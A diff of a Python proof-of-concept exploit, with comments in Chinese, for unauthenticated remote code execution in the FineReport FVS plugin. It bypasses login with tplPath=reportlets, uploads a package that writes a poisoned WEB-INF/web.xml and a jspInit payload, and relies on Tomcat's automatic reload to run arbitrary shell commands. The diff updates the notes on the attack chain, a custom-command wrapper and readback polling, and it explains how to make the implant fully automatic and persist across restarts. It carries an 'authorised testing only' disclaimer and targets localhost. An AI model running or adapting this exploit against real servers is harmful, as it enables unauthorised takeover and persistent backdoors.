@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-FineReport FVS 插件未授权 RCE PoC —— 路线二：附件层 web.xml 投毒（重载即执行版）
+FineReport FVS 插件未授权 RCE PoC —— 路线二：附件层 web.xml 投毒（应用由 Tomcat 管理时全自动）
 =================================================================================
-配套: poc-h2.py(路线一: H2 数据连接层注入) | 原理见 vulnerability-analysis.md
+配套: poc-h2.py(路线一: H2 数据连接层注入; 其 --implant 为全自动版) | 原理见 vulnerability-analysis.md
 
 链路:
   tplPath=reportlets 绕过登录校验
@@ -11,17 +11,27 @@ FineReport FVS 插件未授权 RCE PoC —— 路线二：附件层 web.xml 投�
   → 附件层按包内清单 AttachmentLayer.json 写文件（WorkResource 根 = WEB-INF）
      · WEB-INF/web.xml = 投毒部署描述符（<jsp-file> 指向 WEB-INF/x.env + <load-on-startup>）
      · WEB-INF/x.env   = jspInit 声明块（.env 后缀过 FileSecurityChecker 白名单）
-  → 容器重载（自动 reloadable 环境即刻；否则随重启/重部署）
+  → Tomcat 对"由它自己管理"的应用会监听 WEB-INF/web.xml, 一变就自动重载(实测 5–8 秒)
     → Jasper 预编译该 JSP → 生成 servlet 初始化 → jspInit() 自动执行
     → 命令以应用进程权限运行, 输出写回 webroot → GET 静态文件回显
-  ★ 重载后无需对目标发起任何触发请求（更隐蔽, 命令在写入时固化）
+    （执行时不需要对目标发起任何触发请求, 命令在写入时固化）
+
+说明(实验基线: 插件 4.13.0 + 官方 ops 镜像):
+  全自动的条件是"应用由 Tomcat 自己管理"(放在 webapps 下自动部署, 或由
+  conf/Catalina/localhost/ 下的描述符部署)——Tomcat 会监听这类应用的 WEB-INF/web.xml。
+  实测: 写入后 5–8 秒触发重载, 约 50–63 秒后命令执行, 无需重启, 无触发请求。
+  官方 ops 镜像例外: /webroot 被直接写在 server.xml 里且 appBase="none", Tomcat 不监听它的
+  web.xml(开 reloadable 也只监听 classes/lib)。在这种部署上本脚本只完成植入, 需等重启/重部署;
+  或先用 poc-h2.py --implant 写一个上下文描述符, 应用即转为 Tomcat 管理, 之后本脚本全自动。
+
+条件: 目标为 Linux(命令经 /bin/sh 执行); FR 进程对 Tomcat 目录有写权限(官方镜像以 root 运行)。
 
 仅用于授权测试 / 自建靶场。禁止指向生产或他人资产。
 
 用法:
-  python3 poc-attach.py -t http://127.0.0.1:18081                 # 默认命令: 落地标记并回读
+  python3 poc-attach.py -t http://127.0.0.1:18081                 # 默认命令: 落地标记, 等待自动重载并回读
   python3 poc-attach.py -t http://127.0.0.1:18081 -c "id"         # 自定义命令(写入时固化)
-  python3 poc-attach.py -t http://127.0.0.1:18081 --wait 300      # 最长等重载 300 秒
+  python3 poc-attach.py -t http://127.0.0.1:18081 --wait 300      # 等自动重载执行的最长秒数
 说明: FR 本体无自带 web.xml（servlet 走注解注册），新写入的 web.xml 不含
       metadata-complete，不影响 FR 原有功能。还原 = 删除 WEB-INF/web.xml 与
       WEB-INF/x.env 后重启。
@@ -109,8 +119,11 @@ def main():
     o = urllib.parse.urlsplit(base)
     origin = f"{o.scheme}://{o.netloc}"
     readback = f"{origin}/webroot/attach_poc_readback.txt"
-    cmd = a.cmd or (f"(echo PWN-ATTACH-LAYER-RCE; id; hostname; date) > "
-                    f"/usr/local/tomcat/webapps/webroot/attach_poc_readback.txt 2>&1")
+    if a.cmd:
+        cmd = f"( {a.cmd} ) > /usr/local/tomcat/webapps/webroot/attach_poc_readback.txt 2>&1"
+    else:
+        cmd = (f"(echo PWN-ATTACH-LAYER-RCE; id; hostname; date) > "
+               f"/usr/local/tomcat/webapps/webroot/attach_poc_readback.txt 2>&1")
 
     # ---- 1) 未授权上传复用包（命令已固化进 jspInit）----
     props = json.dumps({"name": "apwn", "structureVersion": "2.0", "envVersion": "11.0"})
@@ -136,8 +149,8 @@ def main():
     print(f"[2] apply   -> {st2}  {d2[:110].decode('utf-8', 'replace')}")
     print("    （WEB-INF/web.xml + WEB-INF/x.env 已落盘, 命令已固化进 jspInit）")
 
-    # ---- 3) 等重载：重载预编译时 jspInit 自动执行, 回读文件出现即完成 ----
-    print(f"[3] 等待重载(最长 {a.wait}s, 每 6s 探测回读文件)...")
+    # ---- 3) 等待: Tomcat 发现 web.xml 变化后自动重载, jspInit 执行, 回读文件出现即完成 ----
+    print(f"[3] 等待 Tomcat 自动重载并执行(最长 {a.wait}s, 每 6s 探测回读文件)...")
     deadline = time.time() + a.wait
     armed = False
     while time.time() < deadline:
@@ -145,7 +158,7 @@ def main():
             stp, dp = req(urllib.parse.urlsplit(readback), timeout=8)
             if stp == 200 and dp.strip():
                 armed = True
-                print("    命令已在重载中执行（无需任何触发请求）:")
+                print("    命令已执行（无需任何触发请求）:")
                 print("-" * 46)
                 print(dp.decode("utf-8", "replace").strip())
                 print("-" * 46)
@@ -154,9 +167,10 @@ def main():
             pass
         time.sleep(6)
     if not armed:
-        print("    超时未生效: 该部署未开 reloadable/未发生重载。")
+        print("    超时: 期间没有发生重载。该应用很可能被直接写在 server.xml 里(如官方 ops 镜像),")
+        print("          Tomcat 不监听它的 web.xml(见文件头'说明')。")
         print("    web.xml 已投毒——任何一次重启/发版/重部署, jspInit 将在启动时自动执行。")
-        print("    （实验容器可 docker restart <engine> 后重跑本脚本验证）")
+        print("    想自动触发: 用 poc-h2.py --implant 写一个上下文描述符, 之后本脚本即可全自动。")
         sys.exit(2)
     print("[*] 完成。")
 
